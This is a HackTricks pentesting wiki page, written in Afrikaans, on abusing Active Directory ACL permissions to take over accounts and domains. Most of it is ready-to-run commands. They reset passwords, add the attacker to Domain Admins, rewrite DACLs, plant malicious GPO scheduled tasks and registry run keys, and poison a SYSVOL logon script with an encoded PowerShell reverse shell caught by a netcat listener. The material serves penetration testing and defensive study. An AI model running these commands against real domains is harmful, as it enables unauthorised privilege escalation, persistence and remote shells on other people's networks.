# Misbruik van Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie bladsy is meestal 'n opsomming van die tegnieke van** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, kyk na die oorspronklike artikels.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Hierdie voorreg gee 'n aanvaller volle beheer oor 'n geteikende gebruikersrekening. Sodra `GenericAll` regte bevestig is met die `Get-ObjectAcl` bevel, kan 'n aanvaller:

- **Verander die teikengebruiker se wagwoord**: Deur `net user <username> <password> /domain` te gebruik, kan die aanvaller die gebruiker se wagwoord terugstel.
- Vanaf Linux kan jy dieselfde oor SAMR met Samba `net rpc` doen:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **As die rekening gedeaktiveer is, maak die UAC-vlag skoon**: `GenericAll` laat toe om `userAccountControl` te wysig. Vanaf Linux kan BloodyAD die `ACCOUNTDISABLE`-vlag verwyder:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Ken 'n SPN toe aan die gebruiker se rekening om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT) hashes uit te trek en te probeer kraak.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Gerigte ASREPRoasting**: Deaktiveer pre-authentication vir die gebruiker, sodat hul rekening kwesbaar is vir ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Met `GenericAll` op 'n gebruiker kan jy 'n sertifikaat-gebaseerde credential byvoeg en as hulle aanmeld sonder om hul wagwoord te verander. Sien:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Regte op 'n groep**

Hierdie bevoegdheid laat 'n aanvaller toe om groepslidmaatskap te manipuleer as hulle `GenericAll` regte op 'n groep soos `Domain Admins` het. Nadat hulle die groep se distinguished name met `Get-NetGroup` geïdentifiseer het, kan die aanvaller:

- **Voeg hulself by die Domain Admins-groep**: Dit kan gedoen word via direkte opdragte of deur modules soos Active Directory of PowerSploit te gebruik.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Vanaf Linux kan jy ook BloodyAD gebruik om jouself by arbitrêre groepe te voeg wanneer jy GenericAll/Write-lidmaatskap oor hulle het. As die teikengroep geneste is in “Remote Management Users”, sal jy onmiddellik WinRM-toegang kry op hosts wat daardie groep in ag neem:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Om hierdie voorregte op 'n rekenaarobjek of 'n gebruikersrekening te hê, maak dit moontlik om:

- **Kerberos Resource-based Constrained Delegation**: Maak dit moontlik om 'n rekenaarobjek oor te neem.
- **Shadow Credentials**: Gebruik hierdie tegniek om 'n rekenaar- of gebruikersrekening te imiteer deur die voorregte te misbruik om shadow credentials te skep.

## **WriteProperty on Group**

As 'n gebruiker `WriteProperty` regte het op alle objekte vir 'n spesifieke groep (bv. `Domain Admins`), kan hulle:

- **Voeg hulself by die Domain Admins Group**: Deur die `net user` en `Add-NetGroupUser` opdragte te kombineer, maak hierdie metode privilege escalation binne die domein moontlik.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) op Groep**

Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe te voeg, soos `Domain Admins`, deur opdragte wat groepslidmaatskap direk manipuleer. Deur die volgende reeks opdragte te gebruik, kan aanvallers hulself byvoeg:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

'n Gelyksoortige voorreg: dit laat aanvallers toe om hulself direk by groepe te voeg deur groepseienskappe te wysig indien hulle die `WriteProperty`-reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word met die volgende gedoen:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Om die `ExtendedRight` op 'n gebruiker vir `User-Force-Change-Password` te hê, maak dit moontlik om wagwoorde te herstel sonder om die huidige wagwoord te ken. Die verifikasie van hierdie reg en die benutting daarvan kan deur PowerShell of alternatiewe opdragreël-gereedskap gedoen word, wat verskeie metodes bied om 'n gebruiker se wagwoord te herstel, insluitend interaktiewe sessies en one-liners vir nie-interaktiewe omgewings. Die opdragte wissel van eenvoudige PowerShell-aanroepe tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van aanvalvektore demonstreer.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner op Groep**

As 'n aanvaller ontdek dat hulle `WriteOwner`-regte oor 'n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral betekenisvol wanneer die betrokke groep `Domain Admins` is, aangesien die verandering van eienaarskap wyer beheer oor groep-eienskappe en lidmaatskap moontlik maak. Die proses behels die identifisering van die korrekte objek via `Get-ObjectAcl` en dan die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, óf deur SID óf deur naam.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite op Gebruiker**

Hierdie toestemming stel 'n aanvaller in staat om eienskappe van 'n gebruiker te wysig. Spesifiek, met `GenericWrite`-toegang kan die aanvaller die pad na die logon-skrip van 'n gebruiker verander om 'n kwaadwillige skrip by gebruiker-aanmelding uit te voer. Dit word bereik deur die `Set-ADObject`-opdrag te gebruik om die `scriptpath`-eienskap van die teiken-gebruiker by te werk sodat dit na die aanvaller se skrip wys.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Met hierdie voorreg kan aanvallers groeplidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n credential object, dit gebruik om gebruikers by 'n groep te voeg of te verwyder, en die lidmaatskapveranderinge te verifieer met PowerShell-opdragte.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Vanaf Linux kan Samba `net` lede byvoeg/verwyder wanneer jy `GenericWrite` op die groep het (nuttig wanneer PowerShell/RSAT nie beskikbaar is nie):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Om 'n AD-voorwerp te besit en `WriteDACL`-voorregte daarop te hê, stel 'n aanvaller in staat om vir homself `GenericAll`-voorregte oor die voorwerp te gee. Dit word bereik deur ADSI manipulation, wat volle beheer oor die voorwerp moontlik maak en die vermoë gee om die groepslidmaatskappe daarvan te wysig. Ten spyte hiervan bestaan daar beperkinge wanneer 'n mens probeer om hierdie voorregte te misbruik met behulp van die Active Directory-module se `Set-Acl` / `Get-Acl` cmdlets.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner vinnige oorname (PowerView)

Wanneer jy `WriteOwner` en `WriteDacl` oor 'n gebruikers- of diensrekening het, kan jy volle beheer neem en die wagwoord daarvan terugstel met PowerView sonder om die ou wagwoord te ken:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Aantekeninge:
- Dit mag nodig wees om eers die eienaar na jouself te verander as jy slegs `WriteOwner` het:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valideer toegang met enige protokol (SMB/LDAP/RDP/WinRM) na 'n wagwoordherstel.

## **Replikasie op die domein (DCSync)**

Die DCSync-aanval maak gebruik van spesifieke replikasie-toestemmings op die domein om 'n Domain Controller na te boots en data te sinchroniseer, insluitend gebruikersbewyse. Hierdie kragtige tegniek benodig toestemmings soos `DS-Replication-Get-Changes`, waardeur aanvallers sensitiewe inligting uit die AD-omgewing kan onttrek sonder direkte toegang tot 'n Domeinbeheerder. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegering <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegering

Gedelegeerde toegang om Group Policy Objects (GPOs) te bestuur kan aansienlike sekuriteitsrisiko's inhou. Byvoorbeeld, indien 'n gebruiker soos `offense\spotless` GPO-bestuursregte toegekry word, mag hulle voorregte hê soos **WriteProperty**, **WriteDacl**, en **WriteOwner**. Hierdie toestemmings kan vir kwaadwillige doeleindes misbruik word, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO-toestemmings opspoor

Om verkeerd-gekonfigureerde GPOs te identifiseer, kan PowerSploit se cmdlets aan mekaar gekoppel word. Dit maak dit moontlik om GPOs te ontdek wat 'n spesifieke gebruiker regte gee om te bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Rekenaars met 'n gegewe beleid toegepas**: Dit is moontlik om te bepaal watter rekenaars 'n spesifieke GPO raak, wat help om die omvang van die potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Beleide toegepas op 'n gegewe rekenaar**: Om te sien watter beleide op 'n bepaalde rekenaar toegepas is, kan kommandos soos `Get-DomainGPO` gebruik word.

**OU's met 'n gegewe beleid toegepas**: Identifisering van organisasie-eenhede (OUs) wat deur 'n gegewe beleid geraak word, kan gedoen word met `Get-DomainOU`.

Jy kan ook die instrument [**GPOHound**](https://github.com/cogiceo/GPOHound) gebruik om GPOs te enumereer en probleme daarin te vind.

### Misbruik GPO - New-GPOImmediateTask

Verkeerd-geconfigureerde GPO's kan uitgebuit word om kode uit te voer, byvoorbeeld deur 'n onmiddellike geskeduleerde taak te skep. Dit kan gebruik word om 'n gebruiker by die plaaslike administratorsgroep op geraakte masjiene te voeg, wat bevoegdhede aansienlik verhoog:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Die GroupPolicy module, indien geïnstalleer, maak dit moontlik om nuwe GPOs te skep en te koppel, en voorkeurinstellings soos registry values te stel om backdoors op geaffekteerde rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en 'n gebruiker by die rekenaar aanmeld vir uitvoering:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Misbruik GPO

SharpGPOAbuse bied 'n metode om bestaande GPOs te misbruik deur take by te voeg of instellings te wysig sonder die behoefte om nuwe GPOs te skep. Hierdie hulpmiddel vereis die wysiging van bestaande GPOs of die gebruik van RSAT tools om nuwe GPOs te skep voordat veranderinge toegepas word:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Dwing beleidsopdatering

GPO-opdaterings gebeur gewoonlik ongeveer elke 90 minute. Om hierdie proses te versnel, veral na die aanbring van 'n verandering, kan die `gpupdate /force` opdrag op die teikenrekenaar gebruik word om 'n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPOs toegepas word sonder om op die volgende outomatiese opdateringsiklus te wag.

### Onder die kap

By inspeksie van die Scheduled Tasks vir 'n gegewe GPO, soos die `Misconfigured Policy`, kan die toevoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur skripte of opdragreëlinstrumente wat daarop gemik is om stelselgedrag te verander of privilegies te verhoog.

Die struktuur van die taak, soos getoon in die XML-konfigurasielêer wat deur `New-GPOImmediateTask` gegenereer word, skets die besonderhede van die scheduled task - insluitend die opdrag wat uitgevoer gaan word en sy triggers. Hierdie lêer verteenwoordig hoe scheduled tasks binne GPOs gedefinieer en bestuur word, en bied 'n metode om arbitrêre opdragte of skripte uit te voer as deel van beleidsdwinging.

### Gebruikers en Groepe

GPOs maak ook die manipulasie van gebruikers- en groepelidmaatskappe op teikenstelsels moontlik. Deur die Users and Groups beleidlêers direk te wysig, kan angrype gebruikers by bevoegde groepe voeg, soos die plaaslike `administrators` groep. Dit is moontlik deur die delegasie van GPO-bestuursmagte, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groepelidmaatskappe te verander.

Die XML-konfigurasielêer vir Users and Groups skets hoe hierdie veranderinge geïmplementeer word. Deur inskrywings tot hierdie lêer by te voeg, kan spesifieke gebruikers verhoogde voorregte oor aangetas stelsels verleen word. Hierdie metode bied 'n direkte benadering tot privilege escalation deur GPO-manipulasie.

Verder kan addisionele metodes vir die uitvoer van kode of die handhawing van persistence, soos die gebruik van logon/logoff-skripte, die wysiging van registersleutels vir autoruns, die installering van sagteware via .msi-lêers, of die redigering van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie weë om toegang te behou en teikenstelsels te beheer deur die misbruik van GPOs.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Vind aanmeldskripte
- Inspekteer gebruikersattribuutte vir 'n gekonfigureerde aanmeldskrip:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Kruip domain shares om snelkoppels of verwysings na skripte op te spoor:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Ontleed `.lnk`-lêers om teikens wat na SYSVOL/NETLOGON wys op te los (nuttige DFIR-truuk en vir aanvallers sonder direkte GPO-toegang):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound wys die `logonScript` (scriptPath) attribuut op gebruikersnodes wanneer dit teenwoordig is.

### Valideer skryf-toegang (moenie op share listings staatmaak nie)
Outomatiese tooling kan SYSVOL/NETLOGON as slegs-lees wys, maar onderliggende NTFS ACLs kan steeds skryf-toegang toelaat. Toets altyd:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
As die lêergrootte of mtime verander, het jy skryfreg. Bewaar die oorspronklikes voordat jy wysig.

### Poison a VBScript logon script for RCE
Voeg 'n opdrag by wat 'n PowerShell reverse shell loods (genereer vanaf revshells.com) en behou die oorspronklike logika om te voorkom dat die sakefunksie breek:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Luister op jou host en wag vir die volgende interactive logon:
```bash
rlwrap -cAr nc -lnvp 443
```
Aantekeninge:
- Uitvoering gebeur onder die aangemelde gebruiker se token (nie SYSTEM nie). Reikwydte is die GPO link (OU, site, domain) wat daardie script toepas.
- Maak skoon deur die oorspronklike inhoud/tydstempels na gebruik te herstel.


## Verwysings

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
